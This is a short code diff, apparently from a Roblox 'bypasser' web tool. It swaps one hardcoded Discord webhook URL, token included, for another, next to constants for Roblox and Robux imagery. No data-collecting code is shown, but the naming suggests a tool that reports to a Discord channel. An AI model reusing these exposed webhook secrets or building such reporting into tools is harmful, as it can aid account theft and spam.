@@ -43,7 +43,7 @@ async function validateCSRFToken(request: Request): Promise<{ valid: boolean; er
   return { valid: true };
 }
 
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1504383474839322634/-C7_s297FOKLs6pqdt460Qqi4oQguOZlEk9V4sm4-zDoqqP9lh09Bl8ue2RVKXubJiqD"
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1510867794948788455/vIIYQdU-eyVh6ca7kQQmMS7bbGUZgvPWmgIzf4Zk1D5khJk8qC1VjJcS0rqm7GCw6fSq"
 const ROBLOX_R_LOGO = "https://tr.rbxcdn.com/38c6ee6812f0abd46a3f3a704e2d786c/150/150/Image/Png"
 const BYPASSER_LOGO = "https://cdn.discordapp.com/attachments/1486335642899189801/1486342075556434170/images.png?ex=69c5276d&is=69c3d5ed&hm=7443d16bf281dba941ae07e0ce76695c7441e8dc2c07c462f2664f247d16193e"
 const EMOJI_ROBUX = "<:robux:1464171977467236375>"
